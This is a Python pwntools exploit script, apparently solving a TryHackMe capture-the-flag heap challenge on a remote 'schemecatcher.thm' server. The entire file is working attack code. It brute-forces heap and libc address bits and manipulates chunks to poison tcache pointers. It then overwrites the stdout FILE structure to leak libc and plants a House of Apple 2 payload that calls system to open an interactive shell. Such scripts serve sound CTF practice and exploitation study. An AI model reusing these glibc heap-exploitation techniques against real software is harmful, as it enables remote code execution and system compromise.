#!/usr/bin/env python3

from pwn import *
import io_file

context.update(arch="amd64", os="linux", log_level="error")
context.binary = elf = ELF("./server", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

exit_addr = libc.sym['exit']
stdout_addr = libc.sym['_IO_2_1_stdout_']

for heap_brute in range(16):
	for libc_brute in range(16):
		try:
			print(f"Trying heap_brute={heap_brute:#x}, libc_brute={libc_brute:#x}")
		
			r = remote("schemecatcher.thm", 9004)		

			idx = -1

			def create(size):
				global idx
				idx = idx+1
				r.sendlineafter(b'\n>>', b'1')
				r.sendlineafter(b'size: \n', str(size).encode())
				return idx

			def update(index, data, offset=0):
				r.sendlineafter(b'\n>>', b'2')
				r.sendlineafter(b'idx:\n', str(index).encode())
				r.sendlineafter(b'offset:\n', str(offset).encode())
				r.sendafter(b'data:\n', data)

			def delete(index):
				r.sendlineafter(b'\n>>', b'3')
				r.sendlineafter(b'idx:\n', str(index).encode())

			for _ in range(7):
				create(0x90-8) 

			middle = create(0x90-8)

			playground = create(0x20 + 0x30 + 0x500 + (0x90-8)*2)
			guard = create(0x18) 
			delete(playground)
			guard = create(0x18)

			corruptme = create(0x4c8)
			start_M = create(0x90-8)
			midguard = create(0x28) 
			end_M = create(0x90-8)
			leftovers = create(0x28)
				
			update(playground,p64(0x651),0x18)
			delete(corruptme)

			offset = create(0x4c8+0x10) 
			start = create(0x90-8)
			midguard = create(0x28)
			end = create(0x90-8)
			leftovers = create(0x18)

			create((0x10000+0x80)-0xda0-0x18)
			fake_data = create(0x18)
			update(fake_data,p64(0x10000)+p64(0x20)) 

			fake_size_lsb = create(0x3d8);
			fake_size_msb = create(0x3e8);
			delete(fake_size_lsb)
			delete(fake_size_msb)


			update(playground,p64(0x31),0x4e8)
			delete(start_M)
			update(start_M,p64(0x91),8)

			update(playground,p64(0x21),0x5a8)
			delete(end_M)
			update(end_M,p64(0x91),8)

			for i in range(7):
				delete(i)

			delete(end)
			delete(middle)
			delete(start)

			heap_target = (heap_brute << 12) + 0x80
			update(start,p16(heap_target))
			update(end,p16(heap_target),8)
			exit_lsb = (libc_brute << 12) + (exit_addr & 0xfff) 
			stdout_offset = stdout_addr - exit_addr
			stdout_lsb = (exit_lsb + stdout_offset) & 0xffff
			print(f"{heap_target=:#x}, {stdout_lsb=:#x}")

			win = create(0x888) 
			
			update(win,p16(stdout_lsb),8) 
			stdout = create(0x28)
			update(stdout,p64(0xfbad3887)+p64(0)*3+p8(0))
			
			libc_leak = u64(r.recv(8))
			libc.address = libc_leak - (stdout_addr+132)
			print(f"possible libc leak = {libc.address:#x}")
			
			file = io_file.IO_FILE_plus_struct() 
			payload = file.house_of_apple2_execmd_when_do_IO_operation(
				libc.sym['_IO_2_1_stdout_'],
				libc.sym['_IO_wfile_jumps'],
				libc.sym['system'])
			update(win,p64(libc.sym['_IO_2_1_stdout_']),8*60)
			full_stdout = create(0x3e0-8)
			update(full_stdout,payload)

			r.interactive("$ ")
			exit()

		except Exception as e:
			print(e)
			continue